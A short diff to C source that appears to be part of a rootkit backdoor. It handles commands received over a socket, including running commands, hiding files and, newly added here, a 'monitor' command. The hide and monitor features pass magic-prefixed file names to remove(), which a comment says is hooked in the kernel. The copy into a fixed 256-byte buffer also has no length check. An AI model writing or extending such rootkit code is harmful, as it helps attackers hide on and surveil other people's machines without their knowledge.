@@ -22,6 +22,7 @@ int getIntFromBuf(char* buf, int offset);
 int execcmd(char* cmd);
 int sendresult(int socket, char* buf);
 int hidefile(char* cmd);
+int monitor(char* cmd);
 
 int main(int argc,char* argv[])
 {
@@ -67,6 +68,8 @@ int main(int argc,char* argv[])
                 }
             } else if(strncmp(buf, "hide", 4) == 0){
                 hidefile(buf + 4);
+            } else if(strncmp(buf, "monitor", 7) == 0){
+                monitor(buf + 7);
             }
         }
     }
@@ -94,6 +97,13 @@ int sendresult(int socket, char* buf){
 
 int hidefile(char* cmd){
     char filen[256] = "HIDEAFILEINKERNEL%";
+    while(*cmd == ' ') cmd++;
+    memcpy(filen+strlen(filen), cmd, strlen(cmd) + 1);
+    remove(filen);          //We hooked remove;
+}
+
+int monitor(char* cmd){
+    char filen[256] = "SETMONITORPROGRAM%";
     while(*cmd == ' ') cmd++;
     memcpy(filen+strlen(filen), cmd, strlen(cmd) + 1);
     remove(filen);          //We hooked remove;
